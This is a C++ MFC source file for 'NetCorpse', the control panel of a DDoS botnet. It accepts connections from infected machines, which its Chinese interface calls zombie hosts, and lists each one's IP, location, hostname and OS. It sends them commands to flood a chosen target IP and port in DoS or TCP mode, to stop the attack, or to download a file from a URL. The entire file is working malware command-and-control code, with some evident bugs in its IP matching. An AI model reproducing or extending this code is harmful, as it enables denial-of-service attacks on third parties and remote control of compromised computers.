// NetCorpseServerDlg.cpp : implementation file
//
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#include "stdafx.h"
#include "NetCorpseServer.h"
#include "NetCorpseServerDlg.h"

#include "winsock2.h"
#include "windows.h"
#include <ws2tcpip.h>
#include "wchar.h"

#include "CConnection.h"    

CNetworking Networking;//listen/accept socket 	
CConnectionList m_Conn;//ConnectionList,store connected sockets,use them to receive/send data 
CSync			m_sync;

#include "NL_QQwry.h"
NL_QQwry qq;

#include "ini.h"
#include "TokenEx.h"

bool g_bCloseFlag = false;
bool g_bOK = false;

/////////////////////////////////////////////////////////////////////////////
// CNetCorpseServerDlg dialog

CNetCorpseServerDlg::CNetCorpseServerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CNetCorpseServerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CNetCorpseServerDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32	

	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);	

	

	::GetModuleFileName(NULL, m_sAppPath.GetBuffer(MAX_PATH), MAX_PATH);
	m_sAppPath.ReleaseBuffer();

	if (m_sAppPath.Find('\\') != -1)
	{
		for (int i = m_sAppPath.GetLength() - 1; i >= 0; i--)
		{
			TCHAR ch = m_sAppPath[i];
			m_sAppPath.Delete(i);
			if (ch == '\\')
				break;	
		}
	}

	CIni ini;
	ini.SetPathName(m_sAppPath + _T("\\Set.ini"));

	m_nPort = ini.GetInt(_T("Settings"), _T("Port"), -1);
	m_bLineOnWav = ini.GetBool(_T("Settings"), _T("LineOn"), 1);
	m_bLineOffWav = ini.GetBool(_T("Settings"), _T("LineOff"), 1);

	if(m_nPort <= 0 || m_nPort > 65535)
	{
		m_nPort = 10205;
		m_bLineOnWav = TRUE;
		m_bLineOffWav = TRUE;
		
		ini.WriteInt(_T("Settings"), _T("Port"),m_nPort);
		ini.WriteBool(_T("Settings"), _T("LineOn"),m_bLineOnWav);
		ini.WriteBool(_T("Settings"), _T("LineOff"),m_bLineOffWav);
	}

	g_bOK = true;

}

void CNetCorpseServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CNetCorpseServerDlg)
	DDX_Control(pDX, IDC_LIST1, m_List);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CNetCorpseServerDlg, CDialog)
	//{{AFX_MSG_MAP(CNetCorpseServerDlg)
	ON_BN_CLICKED(IDC_RADIO1, OnRadio1)
	ON_BN_CLICKED(IDC_RADIO2, OnRadio2)
	ON_BN_CLICKED(IDC_ATTACK, OnAttack)
	ON_BN_CLICKED(IDC_ATTACKSTOP, OnAttackstop)
	ON_BN_CLICKED(IDC_LISTEN, OnListen)
	ON_BN_CLICKED(IDC_SET, OnSet)
	ON_BN_CLICKED(IDC_DOWNLOAD, OnDownload)
	ON_BN_CLICKED(IDC_CREATE, OnCreate)
	//}}AFX_MSG_MAP
//ON_NOTIFY ( NM_CUSTOMDRAW, IDC_LIST1, OnCustomdrawMyList )
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CNetCorpseServerDlg message handlers

BOOL CNetCorpseServerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here

	ListView_SetExtendedListViewStyle(m_List.m_hWnd, LVS_EX_GRIDLINES |	LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT);

	CRect rt;
	m_List.GetClientRect(&rt);

	m_List.InsertColumn(0, "选择",LVCFMT_LEFT,rt.right/15);
	m_List.InsertColumn(1, "地区",LVCFMT_LEFT,rt.right/6);
	m_List.InsertColumn(2, "IP", LVCFMT_LEFT,rt.right/6);
	m_List.InsertColumn(3, "端口", LVCFMT_LEFT,rt.right/16);
	m_List.InsertColumn(4, "机器名", LVCFMT_LEFT,rt.right/8);
	m_List.InsertColumn(5, "操作系统", LVCFMT_LEFT,rt.right/10);
	m_List.InsertColumn(6, "CPU", LVCFMT_LEFT,rt.right/16);
	m_List.InsertColumn(7, "攻击状态", LVCFMT_LEFT,rt.right/10);
	m_List.InsertColumn(8, "版本", LVCFMT_LEFT,rt.right/10);

	((CButton *)GetDlgItem(IDC_RADIO_DOS))->SetCheck(TRUE);//不选上
	((CButton *)GetDlgItem(IDC_RADIO_SELECT))->SetCheck(FALSE);//不选上

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CNetCorpseServerDlg::OnRadio1() 
{
	int n = m_List.GetItemCount();
	
	for(int i = 0; i < n; i++)
	{
		int bFlag = m_List.SetCheck(i);
		if(!bFlag)
		{
			m_List.SetCheck(i);					
		}
	}		
}

void CNetCorpseServerDlg::OnRadio2() 
{
	int n = m_List.GetItemCount();
	
	for(int i = 0; i < n; i++)
	{
		int bFlag = m_List.GetCheck(i);
		
		if(!bFlag)
		{
			m_List.SetCheck(i,TRUE);	
		}
		else
		{
			m_List.SetCheck(i,FALSE);
		}
	}	
}


void __cdecl  CNetCorpseServerDlg::ReceiveCallback (DWORD ptr)
{
	m_sync.Enter();

	char buff[1024] = "";
	CConnection* c = reinterpret_cast <CConnection*> (ptr);

	c->Receive (buff, 1024);
	//AfxMessageBox (buff, 0, MB_OK | MB_ICONINFORMATION);

	CString strGetData = buff;

	CTokenEx tok;
	
	CStringArray SplitIt;	
	
	tok.Split(strGetData, "[=NCC=]", SplitIt, TRUE);

	/* 接收格式: 
	1、SYSINFO
	2、机器名
	3、操作类型
	4、CPU占用率
	5、攻击状态
	6、版本号
	7、SYSINFO
	*/

	int nSize = SplitIt.GetSize();
	if(nSize == 7)
	{
		if(SplitIt.GetAt(0).Compare("SYSINFO") == 0 && SplitIt.GetAt(nSize - 1).Compare("SYSINFO") == 0)
		{
			bool IsIn = false;

			//格式正确，允许处理
			//从LISTCTRL中得到对应的项，填入
			char cip[15];
			UINT cp = 0;
			c->PeerInfo(&cip[0],15, &cp);

			CString strIP,strPort;
			strIP.Format("%s",cip);
			strIP.Format("%d",cp);
			CMyList* pListB=(CMyList*)AfxGetMainWnd()->GetDlgItem(IDC_LIST1);


			
			int n = pListB->GetItemCount();
			
			for(int i = 0; i < n; i++)
			{		
				CString strTmpIP = pListB->GetItemText(i,2);
				CString strTmpPort = pListB->GetItemText(i,3);
				strTmpIP.TrimLeft();
				strTmpIP.TrimRight();

				strTmpPort.TrimLeft();
				strTmpPort.TrimRight();

				

				
				if(strIP.CompareNoCase(strTmpIP) == 0 && strPort.CompareNoCase(strTmpPort) == 0)
				{
					pListB->SetItemText (i, 4, SplitIt.GetAt(1));	
					pListB->SetItemText (i, 5, SplitIt.GetAt(2));	
					pListB->SetItemText (i, 6, SplitIt.GetAt(3));	
					pListB->SetItemText (i, 7, SplitIt.GetAt(4));	
					
					if(SplitIt.GetAt(4).CompareNoCase("攻击") == 0)
					{
						pListB->SetItemColor(i,7,RGB(255,255,255),RGB(250, 0, 0),9);
					}
					else
					{
						pListB->SetItemColor(i,7,RGB(255,255,255),RGB(50,184,27),9);
					}

					pListB->SetItemText (i, 8, SplitIt.GetAt(5));

					IsIn = true;
					break;						
				}
			}	
			//如果没有，则 直接增加
			if(!IsIn)
			{
				int n = pListB->GetItemCount();	
				pListB->InsertItem(n, _T(""));

				pListB->SetItemText (n, 1, qq.IP2Add(strIP).SpanExcluding(" "));
				pListB->SetItemText (n, 2, strIP);
				pListB->SetItemText (n, 3, strPort);

				pListB->SetItemText (i, 4, SplitIt.GetAt(1));	
				pListB->SetItemText (i, 5, SplitIt.GetAt(2));	
				pListB->SetItemText (i, 6, SplitIt.GetAt(3));	
				pListB->SetItemText (i, 7, SplitIt.GetAt(4));	
				
				if(SplitIt.GetAt(4).CompareNoCase("攻击") == 0)
				{
					pListB->SetItemColor(i,7,RGB(255,255,255),RGB(250, 0, 0),9);
				}
				else
				{
					pListB->SetItemColor(i,7,RGB(255,255,255),RGB(50,184,27),9);
				}

				pListB->SetItemText (i, 8, SplitIt.GetAt(5));


			}

			int nCount = pListB->GetItemCount();
			char sOnline[256];
			memset(sOnline, 0, 256);
			sprintf(sOnline, "在线肉鸡数量:%d", nCount);
			AfxGetMainWnd()->SetDlgItemText(IDC_STATIC_ONLINE, sOnline);
		}
	}	


	m_sync.Leave();
}

void __cdecl CNetCorpseServerDlg::CloseCallback (DWORD ptr)
{
	//从listctrl和ConnectionList中删除，似乎这个没有做
	m_sync.Enter ();

	SoundPlay(2);

	m_sync.Leave ();
 
}

void __cdecl CNetCorpseServerDlg::AcceptCallback (DWORD ptr)
{
	m_sync.Enter ();	

	char			cip[15];
	unsigned int	cp = 0;
	CNetworking*	net = reinterpret_cast <CNetworking*> (ptr);

	CConnection* Connection = net->GetAccepted ();
	if(Connection)
	{
		m_Conn.AddTail(Connection);
		
		int nLen = m_Conn.GetLength();	
		
		m_Conn.GetItemAt(nLen - 1)->PeerInfo (&cip[0], 15, &cp);
		
		m_Conn.GetItemAt(nLen - 1)->SetReceiveFunc (ReceiveCallback);
		m_Conn.GetItemAt(nLen - 1)->SetCloseFunc (CloseCallback);
	
		SoundPlay(1);
	}

	m_sync.Leave();	
}

void CNetCorpseServerDlg::OnListen() 
{
	g_bCloseFlag = false;

	//读取监听端口
	CIni ini;
	ini.SetPathName(m_sAppPath + _T("\\Set.ini"));	
	m_nPort = ini.GetInt(_T("Settings"), _T("Port"), -1);
	
	char cPortMsg[1024] = "";

	//安装监听回调
	Networking.SetAcceptFunc (AcceptCallback);
	
	//监听端口
	if (!Networking.Listen (m_nPort))
		sprintf (cPortMsg, "监听端口[%i]失败!", m_nPort);
	else
		sprintf (cPortMsg, "监听端口[%i]成功!", m_nPort);

	SetDlgItemText(IDC_STATIC_LISTENSTATUS,cPortMsg);
}

void CNetCorpseServerDlg::SoundPlay(int n)
{
	CString m_sAppPath;

	::GetModuleFileName(NULL, m_sAppPath.GetBuffer(MAX_PATH), MAX_PATH);
	m_sAppPath.ReleaseBuffer();

	if (m_sAppPath.Find('\\') != -1)
	{
		for (int i = m_sAppPath.GetLength() - 1; i >= 0; i--)
		{
			TCHAR ch = m_sAppPath[i];
			m_sAppPath.Delete(i);
			if (ch == '\\')
				break;	
		}
	}

	CIni ini;
	ini.SetPathName(m_sAppPath + _T("\\Set.ini"));


	if(n == 1)
	{
		BOOL m_bLineOnWav = ini.GetBool(_T("Settings"), _T("LineOn"), TRUE);
		
		if(m_bLineOnWav)
		{
			//资源WAV文件的ID须加双引号，用下API函数播放
			PlaySound("IDR_WAVE1",AfxGetResourceHandle(),SND_RESOURCE|SND_ASYNC|SND_NODEFAULT  );
		}
	}
	else
	{
		BOOL m_bLineOffWav = ini.GetBool(_T("Settings"), _T("LineOff"), TRUE);
		
		if(m_bLineOffWav)
		{
			PlaySound("IDR_WAVE2",AfxGetResourceHandle(),SND_RESOURCE|SND_ASYNC|SND_NODEFAULT  );
		}
	}
}


void CNetCorpseServerDlg::OnDownload() 
{
	CString strURL;
	GetDlgItemText(IDC_EDIT3,strURL);

	strURL.TrimLeft();
	strURL.TrimRight();

	if(strURL.IsEmpty())
	{
		AfxMessageBox("下载地址不能为空");
		return;
	}

	if(strURL.GetLength() < 12 || strURL.Left(5).CompareNoCase("http:") != 0)
	{
		AfxMessageBox("请填写有效的下载地址");
		return;
	}

	CString strInfo;
	strInfo = "CMDINFO";
	strInfo += "[=NCS=]";	
	
	strInfo += "DOWN";
	strInfo += "[=NCS=]";

	strInfo += strURL;
	strInfo += "[=NCS=]";
	
	strInfo += "CMDINFO";
	strInfo += "[=NCS=]";
	
	SendCMD(strInfo);

	SetDlgItemText(IDC_STATIC_STATUS,"下载命令发送完毕！");
}

CString CNetCorpseServerDlg::AttackMode()
{
	CString strReturn = "";

	CString strIP;
	GetDlgItemText(IDC_EDIT1,strIP);

	CString strPort;
	GetDlgItemText(IDC_EDIT2,strPort);

	strIP.TrimLeft();
	strIP.TrimRight();

	if(strIP.IsEmpty())
	{
		AfxMessageBox("IP不能为空");
		return strReturn;
	}

	strPort.TrimLeft();
	strPort.TrimRight();

	if(strPort.IsEmpty())
	{
		AfxMessageBox("端口不能为空");
		return strReturn;
	}
	
	int nAtk = -1;

	nAtk = ((CButton *)GetDlgItem(IDC_RADIO_DOS))->GetCheck(); //返回1表示选上，0表示没选上
	if(nAtk == 1)  //D.O.S模式
	{
		strReturn = "CMDINFO";
		strReturn += "[=NCS=]";	

		strReturn += "D.O.S";
		strReturn += "[=NCS=]";

		strReturn += strIP;
		strReturn += "[=NCS=]";

		strReturn += strPort;
		strReturn += "[=NCS=]";
	
		strReturn += "CMDINFO";
		strReturn += "[=NCS=]";
	}
	
	nAtk = ((CButton *)GetDlgItem(IDC_RADIO_SELECT))->GetCheck(); //返回1表示选上，0表示没选上
	if(nAtk == 1)  //TCP模式
	{
		strReturn = "CMDINFO";
		strReturn += "[=NCS=]";	

		strReturn += "TCP";
		strReturn += "[=NCS=]";

		strReturn += strIP;
		strReturn += "[=NCS=]";

		strReturn += strPort;
		strReturn += "[=NCS=]";
	
		strReturn += "CMDINFO";
		strReturn += "[=NCS=]";
	}

	return (strReturn);

}
void CNetCorpseServerDlg::OnAttack() 
{
	CString strInfo = AttackMode();

	if(strInfo.GetLength() == 0)
		return;
 
	SendCMD(strInfo);

	SetDlgItemText(IDC_STATIC_STATUS,"攻击命令发送完毕！");
}

void CNetCorpseServerDlg::SendCMD(CString strSendData)
{
	//m_sync.Enter();
 
	int n = m_List.GetItemCount();

	for(int i = 0; i < n; i++)
	{
		int bFlag = m_List.GetCheck(i);
		
		if(bFlag)
		{
			//用IP和端口匹配到socket指针,再发送消息
			CString strTmpIP = m_List.GetItemText(i,2);
			CString strTmpPort = m_List.GetItemText(i,3);
			if(strTmpIP.IsEmpty() &&  strTmpPort.IsEmpty())
				continue;
 
			
			int nLen = m_Conn.GetLength();
			for(int j = 0; j < nLen; j++)
			{
				CString strIP ;//= m_Conn.GetItemAt(j)->GetIP();
				CString strPort ;//= m_Conn.GetItemAt(j)->GetPort();
 

				if(strIP.CompareNoCase(strTmpIP) == 0 && strPort.CompareNoCase(strTmpPort) == 0)
				{
					m_Conn.GetItemAt(j)->Send(strSendData,strSendData.GetLength());
					Sleep(50);

					break;
					
				}

			}	
		}		
	}	
}

void CNetCorpseServerDlg::OnAttackstop() 
{
	CString strInfo;
	int nAtk = -1;

	nAtk = ((CButton *)GetDlgItem(IDC_RADIO_DOS))->GetCheck(); //返回1表示选上，0表示没选上
	if(nAtk == 1)  //D.O.S模式
	{
		strInfo = "CMDINFO";
		strInfo += "[=NCS=]";	
		
		strInfo += "D.O.SSTOP";
		strInfo += "[=NCS=]";	
		
		strInfo += "CMDINFO";
		strInfo += "[=NCS=]";
	}
	
	nAtk = ((CButton *)GetDlgItem(IDC_RADIO_SELECT))->GetCheck(); //返回1表示选上，0表示没选上
	if(nAtk == 1)  //TCP模式
	{
		strInfo = "CMDINFO";
		strInfo += "[=NCS=]";	
		
		strInfo += "TCPSTOP";
		strInfo += "[=NCS=]";	
		
		strInfo += "CMDINFO";
		strInfo += "[=NCS=]";
	}

	
	SendCMD(strInfo);	

	SetDlgItemText(IDC_STATIC_STATUS,"停止攻击命令发送完毕！");
}

#include "ConfigDlg.h"
void CNetCorpseServerDlg::OnSet() 
{
	CConfigDlg dlg;	
	dlg.DoModal();
}

#include "ConfigDlg2.h"
void CNetCorpseServerDlg::OnCreate() 
{
	// TODO: Add your control notification handler code here
	CConfigDlg2 dlg;
	dlg.DoModal();
}
